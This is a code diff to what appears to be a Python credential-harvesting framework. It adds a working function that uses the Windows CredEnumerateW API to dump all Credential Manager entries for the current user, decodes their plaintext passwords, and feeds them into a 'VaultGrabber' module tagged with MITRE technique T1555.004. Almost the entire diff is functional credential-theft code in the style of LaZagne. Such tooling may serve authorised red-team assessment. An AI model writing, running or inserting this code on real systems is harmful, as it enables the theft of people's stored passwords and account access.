@@ -124,6 +124,100 @@ def _extract_vault_credentials() -> list[dict]:
     return results
 
 
+def _extract_credmanager_credentials() -> list[dict]:
+    """Use CredEnumerateW to extract Credential Manager entries.
+
+    This is the LaZagne/Seatbelt approach -- CredEnumerateW returns
+    all generic credentials for the current user, and CredRead can
+    retrieve the plaintext password blob.
+    """
+    if platform.system() != "Windows":
+        return []
+
+    results = []
+    try:
+        import ctypes
+        import ctypes.wintypes
+
+        advapi32 = ctypes.windll.advapi32
+
+        # CREDENTIAL structure
+        class CREDENTIAL(ctypes.Structure):
+            _fields_ = [
+                ("Flags", ctypes.wintypes.DWORD),
+                ("Type", ctypes.wintypes.DWORD),
+                ("TargetName", ctypes.c_wchar_p),
+                ("Comment", ctypes.c_wchar_p),
+                ("LastWritten", ctypes.wintypes.FILETIME),
+                ("CredentialBlobSize", ctypes.wintypes.DWORD),
+                ("CredentialBlob", ctypes.POINTER(ctypes.c_byte)),
+                ("Persist", ctypes.wintypes.DWORD),
+                ("AttributeCount", ctypes.wintypes.DWORD),
+                ("Attributes", ctypes.c_void_p),
+                ("TargetAlias", ctypes.c_wchar_p),
+                ("UserName", ctypes.c_wchar_p),
+            ]
+
+        # CredEnumerateW(Filter, Flags, Count, Credentials)
+        count = ctypes.wintypes.DWORD(0)
+        creds_ptr = ctypes.c_void_p()
+
+        ret = advapi32.CredEnumerateW(
+            None,  # no filter -- get all
+            0,     # flags
+            ctypes.byref(count),
+            ctypes.byref(creds_ptr),
+        )
+
+        if not ret or count.value == 0:
+            return results
+
+        try:
+            cred_array = ctypes.cast(
+                creds_ptr,
+                ctypes.POINTER(ctypes.POINTER(CREDENTIAL) * count.value),
+            ).contents
+
+            for i in range(count.value):
+                cred = cred_array[i].contents
+                target = cred.TargetName or ""
+                username = cred.UserName or ""
+                cred_type = cred.Type
+
+                # Extract password blob
+                password = ""
+                if cred.CredentialBlobSize > 0 and cred.CredentialBlob:
+                    blob = bytes(cred.CredentialBlob[j] for j in range(cred.CredentialBlobSize))
+                    try:
+                        password = blob.decode("utf-16-le", errors="ignore").rstrip("\x00")
+                    except Exception:
+                        try:
+                            password = blob.decode("utf-8", errors="ignore")
+                        except Exception:
+                            pass
+
+                # Type mapping
+                type_names = {1: "Generic", 2: "Domain Password", 3: "Domain Certificate",
+                              4: "Domain Visible Password", 5: "Generic Certificate",
+                              6: "Domain Extended"}
+                type_name = type_names.get(cred_type, f"Type {cred_type}")
+
+                results.append({
+                    "target": target,
+                    "username": username,
+                    "password": password,
+                    "type": type_name,
+                })
+
+        finally:
+            advapi32.CredFree(creds_ptr)
+
+    except (OSError, AttributeError, Exception) as e:
+        logger.debug(f"CredEnumerate failed: {e}")
+
+    return results
+
+
 class VaultGrabber(GrabberModule):
     name = "vault"
     description = "Extract credentials from Windows Vault (web + Windows credentials)"
@@ -155,7 +249,28 @@ class VaultGrabber(GrabberModule):
                     mitre_technique="T1555.004",
                 ))
 
-        # Method 2: Enumerate vault files for offline analysis
+        # Method 2: CredEnumerateW for Credential Manager entries
+        cred_entries = _extract_credmanager_credentials()
+        for entry in cred_entries:
+            result.credentials.append(ExtractedCredential(
+                source_module=self.name,
+                credential_type="password",
+                target_application=f"Credential Manager ({entry['type']})",
+                url=entry["target"],
+                username=entry["username"],
+                decrypted_value=entry["password"],
+                notes=f"type={entry['type']}",
+                mitre_technique="T1555.004",
+            ))
+        if cred_entries:
+            result.findings.append(self.make_finding(
+                file_path="[CredManager] Windows Credential Manager",
+                description=f"Extracted {len(cred_entries)} Credential Manager entries",
+                score=100 * min(len(cred_entries), 3),
+                matched_value=f"{len(cred_entries)} credentials",
+            ))
+
+        # Method 3: Enumerate vault files for offline analysis
         vault_dir = os.path.join(
             context.appdata_local or "", "Microsoft", "Vault"
         )
